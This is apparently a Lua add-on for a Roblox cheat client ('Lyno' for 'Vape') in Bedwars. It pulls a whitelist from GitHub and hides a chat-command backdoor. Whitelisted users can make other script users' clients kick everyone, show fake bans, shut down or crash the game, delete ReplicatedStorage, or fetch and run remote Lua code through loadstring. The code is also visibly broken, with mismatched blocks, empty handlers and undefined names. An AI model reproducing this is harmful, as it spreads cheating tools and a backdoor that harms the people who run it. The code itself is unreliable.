-- Patched Since 2023/3/23 , Thanks yall Supporting <3
local lazytodolist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/LynoForWindows/whitelist/main/alreadysaidlist.json"))
local function getLplrType()
	local lplr_Type = 0
	if lazytodolist["Owner"] ~= nil then
		for i,v in pairs(lazytodolist["Owner"]) do
			if v.id == tostring(lplr.UserId) then
				lplr_Type = 3
				return lplr_Type
			end
		end
	end
	if lazytodolist["Private"] ~= nil then
		for i,v in pairs(lazytodolist["Private"]) do
			if v.id == tostring(lplr.UserId) then
				lplr_Type = 1
				return lplr_Type
			end
		end
	end
	return lplr_Type
end

local MoonUsers = {}

function CanAttackUser(u)
	local userId = tostring(u.UserId)
	local userType = 0

	if lazytodolist["Private"] ~= nil then
		for i, v in pairs(lazytodolist["Private"]) do
			if v.id == userId then
				userType = 1
				break
			end
		end
	end

	if lazytodolist["Owner"] ~= nil then
		for i, v in pairs(lazytodolist["Owner"]) do
			if v.id == userId then
				userType = 3
				break
			end
		end
	end

	return getLplrType() >= userType
end


	local commands = {
		[";blind default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local blur = Instance.new("BlurEffect")
				blur.Size = 10000000000000
				blur.Parent = game.Lighting
			end
		end,
		[";unblind default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
				if blur then
					blur:Destroy()
				end
			end
		end,
		[";kick default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				wait(1)
				for index, player in pairs(game.Players:GetPlayers()) do
					player:Kick("Ask xylexvxpe to get whitelist lmao")
				end
			end
		end,
		[";ban default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local lplr = game.Players.LocalPlayer
				lplr:Kick("You have been temporarily banned. [Remaining ban duration: 496013012 weeks 2 days 5 hours 19 minutes 49 seconds]")
			end
		end,
		[";rickroll default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/LolcoolLol/scripts/main/rickastley.lua"))()
			end
		end,
		[";freeze default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
			end
		end,
		[";thaw default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
			end
		end,
		[";lobby default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
			end
		end,
		[";shutdown default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				game:Shutdown()
			end
		end,
		[";byfron default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				for i = 1, 10 do
					wait()
					local player = game.Players.LocalPlayer
					local character = player.Character or player.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			end
		end,
		[";breakgame default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				pcall(function()
					local replicatedStorage = game:GetService("ReplicatedStorage")
					for _, child in ipairs(replicatedStorage:GetDescendants()) do
						child:Destroy()
					end
				end)
			end
		end,
		[";breakmap default"] = function()
			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
				end
			end
		end
	end,
	[";host defualt"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			pcall(function()
				
				end
			end)
		end
	end,
	[";crash default"] = function()
		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
			setfpscap(9e9)
		end
	end
}

function isPlayerAllowed()
	return false
end

local txt = game:GetService("TextChatService")
local private = {}
local users = {}

task.spawn(function()
	repeat task.wait()
		for i,plr in pairs(game.Players:GetPlayers()) do 
			if table.find(private,plr) then return end
			if not CanAttackUser(plr) then
				local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
				local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
				newchannel:SendAsync("helloimusinginhaler")
				table.insert(private,plr)
				task.wait(1)
				textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
			end
		end
	until false
end)

local users = {}

txt.OnIncomingMessage = function(msg)
	local p = Instance.new("TextChatMessageProperties")
	local message = msg
	if msg.TextSource then
		local plr2
		local userId = tostring(msg.TextSource.UserId)
		for i,v in pairs(game.Players:GetPlayers()) do
			if tostring(v.UserId) == userId then
				plr2 = v
				break
			end
		end
		local WhitelistFunctions = shared.vapewhitelist
		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
		if CanAttackUser(plr2) and plr2 ~= lplr then
			if message.Text:find("helloimusinginhaler") then
				warningNotification("Vape",plr2.Name.." is using Lyno!",60)
				table.insert(users,plr2.UserId)
			end
		end
		if message.Text:find("helloimusinginhaler") or message.Text:lower():find("privately") then
			p.PrefixText = ""
			return p
		end
		for i,v in pairs(commands) do
			if tostring(i) == tostring(message.Text).." default" or tostring(i) == tostring(message.Text).." "..lplr.DisplayName or tostring(i) == tostring(message.Text) then
				local plr
				for i,v in pairs(game.Players:GetPlayers()) do
					if tostring(v.UserId) == userId then
						plr = v
						break
					end
				end
				if plr == nil then break end
				if not CanAttackUser(plr) then
					v()
				end
				break
			end
		end
		local colors = {
			["red"] = "#ff0000",
			["orange"] = "#ff7800",
			["yellow"] = "#e5ff00",
			["green"] = "#00ff00",
			["blue"] = "#0000ff",
			["purple"] = "#b800b8",
			["pink"] = "#ff00ff",
			["black"] = "#000000",
			["white"] = "#ffffff",
		}
		if CanAttackUser(plr2) and plr2 ~= lplr then
			if message.Text:find("ALAAZA") then
				warningNotification("Vape",plr2.Name.." is using Lyno!",60)
				table.insert(users,plr2.UserId)
				table.insert(lazytodolist["tags"],{
					userid = plr2.UserId,
					color = "yellow",
					tag = "LYNO USER"
				})
			end
		end
		if message.Text:lower():find("alaaza") or message.Text:lower():find("you are now privately chatting") then 
			p.PrefixText = ""
			msg.Text = ""
			return p
		end
		for i,v in pairs(commands) do
			if tostring(i) == tostring(message.Text) then
				local plr
				for i,v in pairs(game.Players:GetPlayers()) do
					if tostring(v.UserId) == userId then
						plr = v
						break
					end
				end
				if plr == nil or plr == lplr then break end
				if not CanAttackUser(plr) then
					v()
				end
				break
			end
		end
		p.PrefixText = msg.PrefixText
		print(message.Text,":",userId)

		local userType = 0
		local hasTag = false
		if users[plr2.UserId] ~= nil then
			p.PrefixText = "<font color='"..colors["yellow"].."'>[LYNO USER]</font> " .. msg.PrefixText
			hasTag = true
			return p
		end

		if lazytodolist["tags"] ~= nil then
			for i, v in pairs(lazytodolist["tags"]) do
				if v.userid == userId then
					hasTag = true
					local color = colors[v.color] or colors["pink"]
					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
				end
			end
		end

		if lazytodolist["Private"] ~= nil then
			for i, v in pairs(lazytodolist["Private"]) do
				if v.id == userId then
					if not hasTag then
						hasTag = true
						p.PrefixText = "<font color='"..colors["pink"].."'>[I use Lyno Private]</font> " .. msg.PrefixText
					end
					userType = 1
				end
			end
		end

		if lazytodolist["Owner"] ~= nil then
			for i, v in pairs(lazytodolist["Owner"]) do
				if v.id == userId then
					if not hasTag then
						hasTag = true
						p.PrefixText = "<font color='#0067FF'>[crylex (Dev)]]</font> " .. msg.PrefixText
					end
					userType = 3
				end
			end
		end

	return p
end
warningNotifcation("Vape","Lyno Custom Loaded !",10)
